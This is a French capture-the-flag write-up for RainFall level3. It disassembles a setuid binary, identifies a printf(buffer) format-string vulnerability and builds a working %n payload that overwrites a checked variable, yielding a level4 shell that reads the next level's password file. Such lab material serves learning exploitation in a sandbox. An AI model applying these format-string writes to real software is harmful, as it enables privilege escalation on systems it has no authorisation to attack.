On a un binaire avec le flag setuid
```
level3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
```
On désassemble
```asm
level3@RainFall:~$ objdump -d -M intel ./level3
080484a4 <v>:
 80484a4:       55                      push   ebp
 80484a5:       89 e5                   mov    ebp,esp
 80484a7:       81 ec 18 02 00 00       sub    esp,0x218
 80484ad:       a1 60 98 04 08          mov    eax,ds:0x8049860
 80484b2:       89 44 24 08             mov    DWORD PTR [esp+0x8],eax
 80484b6:       c7 44 24 04 00 02 00    mov    DWORD PTR [esp+0x4],0x200
 80484bd:       00
 80484be:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484c4:       89 04 24                mov    DWORD PTR [esp],eax
 80484c7:       e8 d4 fe ff ff          call   80483a0 <fgets@plt>
 80484cc:       8d 85 f8 fd ff ff       lea    eax,[ebp-0x208]
 80484d2:       89 04 24                mov    DWORD PTR [esp],eax
 80484d5:       e8 b6 fe ff ff          call   8048390 <printf@plt>
 80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
 80484df:       83 f8 40                cmp    eax,0x40
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    eax,ds:0x8049880
 80484e9:       89 c2                   mov    edx,eax
 80484eb:       b8 00 86 04 08          mov    eax,0x8048600
 80484f0:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 80484f4:       c7 44 24 08 0c 00 00    mov    DWORD PTR [esp+0x8],0xc
 80484fb:       00
 80484fc:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 8048503:       00
 8048504:       89 04 24                mov    DWORD PTR [esp],eax
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
 804850c:       c7 04 24 0d 86 04 08    mov    DWORD PTR [esp],0x804860d
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
 8048518:       c9                      leave
 8048519:       c3                      ret

0804851a <main>:
 804851a:       55                      push   ebp
 804851b:       89 e5                   mov    ebp,esp
 804851d:       83 e4 f0                and    esp,0xfffffff0
 8048520:       e8 7f ff ff ff          call   80484a4 <v>
 8048525:       c9                      leave
 8048526:       c3                      ret
 8048527:       90                      nop
 8048528:       90                      nop
 8048529:       90                      nop
 804852a:       90                      nop
 804852b:       90                      nop
 804852c:       90                      nop
 804852d:       90                      nop
 804852e:       90                      nop
 804852f:       90                      nop
```
On remarque l'appel à **fgets**, **printf**, **fwrite** et **system**. La fonction v est intéressante. Elle est appelé par main et utilise la fonction printf.On voit que avant printf, les registres habiruellement utilisé pour passer des arguments ne sont pas utilisés et restent donc a priori aux valeurs définies avant l'appel a fgets, donc printf est appelé de cette manière: printf(buffer);
>Cela déclenche généralement un warning à la compilation:
```C
test.c:7:19: warning: format not a string literal and no format arguments [-Wformat-security]
    7 |  int res = printf(buffer);
      |
```
On va a priori pouvoir faire un exploit de format.
Un contrôle protège l'appel a **system**, un cmp est fait entre une valeur à l'adresse **0x804988c** et 0x40, soit 64. Si on le passe, **fwrite** est appelé, on suppose que fwrite va écrire dans un buffer ou sur la sortie standard et que system va prendre cette sortie comme argument:
```asm
 80484da:       a1 8c 98 04 08          mov    eax,ds:0x804988c
 80484df:       83 f8 40                cmp    eax,0x40
 80484e2:       75 34                   jne    8048518 <v+0x74>
 80484e4:       a1 80 98 04 08          mov    eax,ds:0x8049880
 80484e9:       89 c2                   mov    edx,eax
 80484eb:       b8 00 86 04 08          mov    eax,0x8048600
 80484f0:       89 54 24 0c             mov    DWORD PTR [esp+0xc],edx
 80484f4:       c7 44 24 08 0c 00 00    mov    DWORD PTR [esp+0x8],0xc
 80484fb:       00
 80484fc:       c7 44 24 04 01 00 00    mov    DWORD PTR [esp+0x4],0x1
 8048503:       00
 8048504:       89 04 24                mov    DWORD PTR [esp],eax
 8048507:       e8 a4 fe ff ff          call   80483b0 <fwrite@plt>
 804850c:       c7 04 24 0d 86 04 08    mov    DWORD PTR [esp],0x804860d
 8048513:       e8 a8 fe ff ff          call   80483c0 <system@plt>
```
Il faut donc écrire 64 à cette adresse **0x804988c** pour passer le contrôle.
Vérifions d'abord la vulnérabilité de printf
```
level3@RainFall:~$ ./level3
aaaa %x %x %x %x %x %x %x
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078
```
plusieurs choses:
- printf imprime d'abord la chaine passé en paramètre
- on a ensuite 0x200 soit 512, on remarque que c'est le premier argument de fgets dans **ebx**
- puis b7fd1ac0 b7ff37d0 qui sont certainement les deuxième et troisième arguments dans **ecx** et **edx**
- enfin 0x61616161 qui est notre chaine "aaaa"
- Le format qui permat d'imprimer le buffer passé en argument est en 4ème position, on peut utiliser %4$ + format

>Le format %n permet d'écrire à l'adresse n, qui est l'adresse d'un int, le nombre de charactère déjà imprimés par printf

essayons d'écrire l'adresse en **little endian**:
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08%4$x"' > /tmp/test_payload
level3@RainFall:~$ cat /tmp/test_payload | ./level3
�804988c
```
Il y a 1 caractère imprimé avant le format %4$x
Nous allons donc faire le payload suivant:
l'adresse où le cmp s'effectue + une chaine random pour compléter + le format %n en quatrième argument de printf:
**0x804988c** + a * 60 + %4$n
soit:
1 octet imprimé + 60 octets imprimés + 3 octets imprimés:
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%4$n"' > /tmp/payload
level3@RainFall:~$ cat /tmp/payload - | ./level3
�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Wait what?!
id
uid=2022(level3) gid=2022(level3) euid=2025(level4) egid=100(users) groups=2025(level4),100(users),2022(level3)
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
Flag!